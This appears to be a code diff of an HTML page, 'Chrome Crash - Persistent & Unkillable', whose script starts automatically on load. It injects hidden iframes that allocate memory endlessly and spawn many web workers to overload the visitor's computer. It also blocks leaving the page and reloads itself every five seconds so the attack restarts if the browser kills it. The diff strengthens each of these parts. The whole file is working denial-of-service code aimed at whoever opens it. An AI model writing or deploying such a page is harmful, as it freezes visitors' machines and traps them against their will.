@@ -1,24 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Ultimate Chrome Crash</title>
+    <title>Chrome Crash - Persistent & Unkillable</title>
 </head>
 <body>
-    <h1>Chrome Crash - Forced System Overload</h1>
+    <h1>Chrome Crash - Maximum Overload</h1>
     <p>The attack starts automatically.</p>
 
     <script>
         function injectHiddenIframes(numFrames) {
             for (let i = 0; i < numFrames; i++) {
                 let iframe = document.createElement("iframe");
-                iframe.style.display = "none"; // Hide iframe
+                iframe.style.display = "none"; 
                 iframe.src = "data:text/html;charset=utf-8," + encodeURIComponent(`
                     <script>
                         function overloadMemory() {
                             let memArray = [];
                             function allocate() {
-                                memArray.push(new Array(1e7).fill(0)); // Massive memory allocation
-                                requestAnimationFrame(allocate);
+                                memArray.push(new Array(1e7).fill(0)); 
+                                requestAnimationFrame(allocate); 
                             }
                             allocate();
                         }
@@ -32,13 +32,13 @@
                                 let worker = new Worker(URL.createObjectURL(blob));
                                 worker.postMessage("Start");
                                 worker.onmessage = () => {
-                                    if (workers.length < navigator.hardwareConcurrency * 20) {
+                                    if (workers.length < navigator.hardwareConcurrency * 30) {
                                         workers.push(worker);
                                         spawnWorkers();
                                     }
                                 };
                             }
-                            for (let i = 0; i < navigator.hardwareConcurrency * 10; i++) {
+                            for (let i = 0; i < navigator.hardwareConcurrency * 15; i++) {
                                 spawnWorkers();
                             }
                         }
@@ -65,15 +65,23 @@
             }
         }
 
-        function forceRestoreLoop() {
+        function preventClosing() {
             window.onbeforeunload = function() {
                 return "This page is trying to prevent you from leaving.";
             };
         }
 
+        function restartProcessLoop() {
+            setInterval(() => {
+                location.reload(); // Keep refreshing to avoid Chrome killing the process
+            }, 5000);
+        }
+
         // Inject multiple hidden iframes running the persistent attack
-        injectHiddenIframes(20); // More iframes = more execution threads
-        forceRestoreLoop(); // Prevent user from closing the tab normally
+        injectHiddenIframes(30); 
+        preventClosing(); // Prevent user from closing the tab normally
+        restartProcessLoop(); // Restart attack if Chrome tries to kill it
     </script>
 </body>
 </html>
+
